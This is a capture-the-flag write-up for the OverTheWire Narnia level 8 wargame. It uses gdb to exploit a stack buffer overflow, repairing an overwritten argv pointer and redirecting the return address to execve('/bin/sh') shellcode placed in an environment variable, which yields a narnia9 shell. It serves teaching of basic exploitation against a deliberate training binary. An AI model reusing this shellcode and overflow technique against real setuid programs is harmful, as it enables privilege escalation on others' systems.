#Narnia8

narnia.labs.overthewire.org

**Username:** narnia8
**Password:** see [narnia7](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria7)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Let's go ahead and run the program and see what it does.
>
>```
# ./narnia8
./narnia8 argument
# ./narnia8 test
test
>```
>
> Not a whole lot happening here, let's look at the code.
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am 
// making "i" global unti i find a fix 
// -morla 
int i; 
>
void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;
>	
	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];
>
	printf("%s\n",bok);
}
>
int main(int argc, char **argv){
>        
	if(argc > 1)       
		func(argv[1]);
	else    
	printf("%s argument\n", argv[0]);
>
	return 0;
}
>```
>
> It looks like the relationship between ```char *blah``` and ```char bok[20]``` is key here.  Let's mess around some more and see what we can get.
>
>
>```
# gdb narnia8
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /root/narnia8...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "A"*19')
Starting program: /root/CTF/OverTheWire/narnia/narnia8 $(python -c 'print "A"*19')
AAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 1961) exited normally]
>```
>
> Ok, running within the size of ```bok``` everything appears to be normal.  Let's try to overflow it.
>
>```
(gdb) run $(python -c 'print "A"*25')
Starting program: /root/CTF/OverTheWire/narnia/narnia8 $(python -c 'print "A"*25')
AAAAAAAAAAAAAAAAAAAAAG��
[Inferior 1 (process 1970) exited normally]
>```
>
> Hmmmm.  We didn't get a seg fault, but we got some weird characters added in with our ```A```.  Let's try a bit bigger.
>
>```
(gdb) run $(python -c 'print "A"*40')
Starting program: /root/CTF/OverTheWire/narnia/narnia8 $(python -c 'print "A"*40')
AAAAAAAAAAAAAAAAAAAAAG��
[Inferior 1 (process 1974) exited normally]
>```
>
> We definately are not seeing the full output.  Let's set find a good location to set a breakpoint and see if we can figure out what's going on.
>
>```asm
(gdb) disas func
Dump of assembler code for function func:
   0x0804842d <+0>:	push   %ebp
   0x0804842e <+1>:	mov    %esp,%ebp
   0x08048430 <+3>:	sub    $0x38,%esp
   0x08048433 <+6>:	mov    0x8(%ebp),%eax
   0x08048436 <+9>:	mov    %eax,-0xc(%ebp)
   0x08048439 <+12>:	movl   $0x14,0x8(%esp)
   0x08048441 <+20>:	movl   $0x0,0x4(%esp)
   0x08048449 <+28>:	lea    -0x20(%ebp),%eax
   0x0804844c <+31>:	mov    %eax,(%esp)
   0x0804844f <+34>:	call   0x8048320 <memset@plt>
   0x08048454 <+39>:	movl   $0x0,0x80497b8
   0x0804845e <+49>:	jmp    0x8048486 <func+89>
   0x08048460 <+51>:	mov    0x80497b8,%eax
   0x08048465 <+56>:	mov    0x80497b8,%edx
   0x0804846b <+62>:	mov    %edx,%ecx
   0x0804846d <+64>:	mov    -0xc(%ebp),%edx
   0x08048470 <+67>:	add    %ecx,%edx
   0x08048472 <+69>:	movzbl (%edx),%edx
   0x08048475 <+72>:	mov    %dl,-0x20(%ebp,%eax,1)
   0x08048479 <+76>:	mov    0x80497b8,%eax
   0x0804847e <+81>:	add    $0x1,%eax
   0x08048481 <+84>:	mov    %eax,0x80497b8
   0x08048486 <+89>:	mov    0x80497b8,%eax
   0x0804848b <+94>:	mov    %eax,%edx
   0x0804848d <+96>:	mov    -0xc(%ebp),%eax
   0x08048490 <+99>:	add    %edx,%eax
   0x08048492 <+101>:	movzbl (%eax),%eax
   0x08048495 <+104>:	test   %al,%al
   0x08048497 <+106>:	jne    0x8048460 <func+51>
   0x08048499 <+108>:	lea    -0x20(%ebp),%eax
   0x0804849c <+111>:	mov    %eax,0x4(%esp)
   0x080484a0 <+115>:	movl   $0x8048580,(%esp)
   0x080484a7 <+122>:	call   0x80482f0 <printf@plt>
   0x080484ac <+127>:	leave  
   0x080484ad <+128>:	ret    
End of assembler dump.
>```
>
> Let's just stop right before our data is printed and try to run it again.
>
>```
(gdb) break *0x080484a7
Breakpoint 1 at 0x80484a7
(gdb) run $(python -c 'print "A"*20')
Starting program: /root/narnia8 $(python -c 'print "A"*20')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7766000
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xff883850:	0x08048580	0xff883868	0x00000014	0xf75b21e3
0xff883860:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xff883870:	0x41414141	0x41414141	0x00414141	0xff884640
0xff883880:	0x00000002	0xff883944	0xff8838a8	0x080484cd
0xff883890:	0xff884640	0xf7771000	0x080484fb	0xf7727000
>```
>
> Good. We can see our ```A``` and even the return ```0x080484cd``` at ```0xff88387c```.  Now we can check and see what the difference is with a larger input.
>
>```
(gdb) x/20x $esp
0xffde9120:	0x08048580	0xffde9138	0x00000014	0xf75881e3
0xffde9130:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffde9140:	0x41414141	0x41414141	0x41414141	0xffde4741
0xffde9150:	0x00000002	0xffde9214	0xffde9178	0x080484cd
0xffde9160:	0xffde962b	0xf7747000	0x080484fb	0xf76fd000
>```
>
> Well, it looks like as soon as input hits the the address ```0xffde913c``` it stops. Let's see what's at the value when we run normal input.
>
>```
(gdb) run $(python -c 'print "A"*19')
Starting program: /root/CTF/OverTheWire/narnia/narnia8 $(python -c 'print "A"*19')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xffb47310:	0x08048580	0xffb47328	0x00000014	0xf754c1e3
0xffb47320:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffb47330:	0x41414141	0x41414141	0x00414141	0xffb48640
0xffb47340:	0x00000002	0xffb47404	0xffb47368	0x080484cd
0xffb47350:	0xffb48640	0xf770b000	0x080484fb	0xf76c1000
(gdb) x/20x 0xffb48640
0xffb48640:	0x41414141	0x41414141	0x41414141	0x41414141
0xffb48650:	0x00414141	0x5f474458	0x524e5456	0x5800373d
0xffb48660:	0x535f4744	0x49535345	0x495f4e4f	0x00313d44
0xffb48670:	0x5f485353	0x4e454741	0x49505f54	0x31313d44
0xffb48680:	0x47003631	0x415f4750	0x544e4547	0x464e495f
>```
>
> Ah, so that position looks like it holds the address of where our ```argv[1]``` is being stored.  So I guess when it overwrites that address it is no longer pointing at our input but to something else in memory.  Can we just make sure we overwrite that location with the intended address?
>
>```
(gdb) run $(python -c 'print "A"*19')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*19')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xffffd3b0:	0x08048580	0xffffd3c8	0x00000014	0xf7e3e1e3
0xffffd3c0:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x00414141	0xffffd63c
0xffffd3e0:	0x00000002	0xffffd4a4	0xffffd408	0x080484cd
0xffffd3f0:	0xffffd63c	0xf7ffd000	0x080484fb	0xf7fb3000
>
(gdb) run $(python -c 'print "A"*20+"\x3c\xd6\xff\xff"')
Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"\x3c\xd6\xff\xff"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xffffd3b0:	0x08048580	0xffffd3c8	0x00000014	0xf7e3e1e3
0xffffd3c0:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x41414141	0xffff443c
0xffffd3e0:	0x00000002	0xffffd4a4	0xffffd408	0x080484cd
0xffffd3f0:	0xffffd637	0xf7ffd000	0x080484fb	0xf7fb3000
>```
>
> So it looks like the address didn't overwrite with the value we intended, but I bet it has to do with the length of the actual input itself. Let's mock up the complete payload to include overwriting the return address and see if we can get the updated address and successfully overwrite it.
>
>```
(gdb) run $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xffffd3a0:	0x08048580	0xffffd3b8	0x00000014	0xf7e3e1e3
0xffffd3b0:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffffd3c0:	0x41414141	0x41414141	0x41414141	0xffff4952
0xffffd3d0:	0x00000002	0xffffd494	0xffffd3f8	0x080484cd
0xffffd3e0:	0xffffd627	0xf7ffd000	0x080484fb	0xf7fb3000
(gdb) x/20x 0xffff4952 
0xffff4952:	0x00000000	0x00000000	0x00000000	0x00000000
0xffff4962:	0x00000000	0x00000000	0x00000000	0x00000000
0xffff4972:	0x00000000	0x00000000	0x00000000	0x00000000
0xffff4982:	0x00000000	0x00000000	0x00000000	0x00000000
0xffff4992:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/20x 0xffffd627 
0xffffd627:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd637:	0x41414141	0x52525252	0x41414141	0x41414141
0xffffd647:	0x41414141	0x52525252	0x47445800	0x4e54565f
0xffffd657:	0x00373d52	0x5f474458	0x53534553	0x5f4e4f49
0xffffd667:	0x313d4449	0x48535300	0x4547415f	0x505f544e
>```
>
> Well, I was expecting the address ```0xffff4952``` to hold our data, but after some looking I was able to locate the ```A``` at ```0xffffd627```.  Let's go back and see if we can overwrite that address with the updated ```argv[1]``` address.
>
>```
(gdb) run $(python -c 'print "A"*20+"\x27\xd6\xff\xff"+"A"*12+"RRRR"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"\x27\xd6\xff\xff"+"A"*12+"RRRR"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA'���AAAAAAAAAAAARRRR'���
>
Program received signal SIGSEGV, Segmentation fault.
0x52525252 in ?? ()
>```
>
> Now we're getting somewhere.  We can finally see our full output. This means that overwriting that address successfully kept us pointing to the input and we ended up get our segmentation fault on the return address.  The only problem is that I don't think we have enough room to put our shellcode into the input.  We can turn back to narnia1 where we used an environment variable to store our shellcode, but we'll have to find the address for it somehow.  After some looking around I found a simple C program that will locate the address of environment variables by name.
>
>```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
>
int main(int argc, char **argv) {
    char *ptr;
    ptr = getenv(argv[1]);
    if( ptr == NULL )
        printf("%s not found\n", argv[1]);
    else printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
    return 0;
}
>```
>
> Let's compile it, setup our shellcode, and see what it gives us.
>
>```
root@kali:~# gcc -Wall -o getenvaddress getenvaddress.c 
getenvaddress.c: In function ‘main’:
getenvaddress.c:10:48: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
     else printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
root@kali:~# export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
root@kali:~# ./getenvaddress EGG
EGG found at ffffe74f
>```
```
narnia8@melinda:/narnia$ export EGG=$(python -c 'print "\x90"*100+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
narnia8@melinda:/narnia$ gdb narnia8
(gdb) break * 0x080484a7
Breakpoint 1 at 0x80484a7
(gdb) run $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20x $esp
0xffffd5e0:	0x08048580	0xffffd5f8	0x00000014	0xf7e55f53
0xffffd5f0:	0x00000000	0x00ca0000	0x41414141	0x41414141
0xffffd600:	0x41414141	0x41414141	0x41414141	0xffff5452
0xffffd610:	0x00000002	0xffffd6d4	0xffffd638	0x080484cd
0xffffd620:	0xffffd818	0xf7ffd000	0x080484fb	0xf7fca000
(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAARRRR���
>
Program received signal SIGSEGV, Segmentation fault.
0x52525252 in ?? ()
(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/s *((char **)environ)
0xffffd841:	"XDG_SESSION_ID=107376"
(gdb) x/s *((char **)environ+1)
0xffffd857:	"SHELL=/bin/bash"
(gdb) x/s *((char **)environ+2)
0xffffd867:	"TERM=xterm"
(gdb) x/s *((char **)environ+3)
0xffffd872:	"SSH_CLIENT=68.1.62.184 36662 22"
(gdb) x/s *((char **)environ+4)
0xffffd892:	"SSH_TTY=/dev/pts/34"
(gdb) x/s *((char **)environ+5)
0xffffd8a6:	"LC_ALL=C"
(gdb) x/s *((char **)environ+6)
0xffffd8af:	"EGG=", '\220' <repeats 100 times>, "\061\333\215C\027\231\315\200\061\311Qhn/shh//bi\215A\v\211\343\315\200"
(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
>
Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA�������
process 5159 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80484a7
```
```
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x19\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1a\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1b\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1c\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1d\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1e\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1f\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAA��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x20\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA&���
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x21\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA!A��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x22\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA"A��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x23\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA#A��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x24\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA$A��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x25\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA%%��
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
Segmentation fault
```
```
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xba\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
Segmentation fault
narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xbf\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
**********
```
